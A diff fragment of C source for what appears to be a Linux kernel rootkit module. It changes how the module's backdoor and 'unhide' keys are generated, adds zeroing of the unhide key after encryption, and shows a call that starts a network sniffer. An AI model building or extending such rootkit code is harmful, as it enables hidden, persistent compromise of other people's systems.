@@ -31,7 +31,6 @@
 #include "lkm.h"
 #include "fs.h"
 #include "version.h"
-#include "auto.h"
 #include "log.h"
 
 #define MAX_PROCFS_SIZE PAGE_SIZE
@@ -65,13 +64,14 @@ static DEFINE_MUTEX(prc_mtx);
 static DEFINE_SPINLOCK(elfbits_spin);
 static struct kv_crypto_st *kvmgc_unhidekey;
 
+// Makefile auto-generated - DO NOT EDIT
+uint64_t auto_unhidekey = 0x0000000000000000;
+
+extern uint64_t auto_bdkey;
+
 /** gcc  - fuck 32 bits shit (for now!) */
 #ifndef __x86_64__
-#error "fuuuuuu Support is only for x86-64"
-#endif
-
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 16, 0)
-#pragma message "!! Warning: Unsupported kernel version GOOD LUCK WITH THAT! !!"
+#error "Support is only for x86-64"
 #endif
 
 MODULE_LICENSE("Dual BSD/GPL");
@@ -872,6 +872,7 @@ cont:
 
 	memcpy(buf, &auto_unhidekey, 8);
 	kv_encrypt(kvmgc_unhidekey, buf, sizeof(buf));
+	auto_unhidekey = 0;
 
 	tsk_sniff = kv_sock_start_sniff();
 	if (!tsk_sniff)
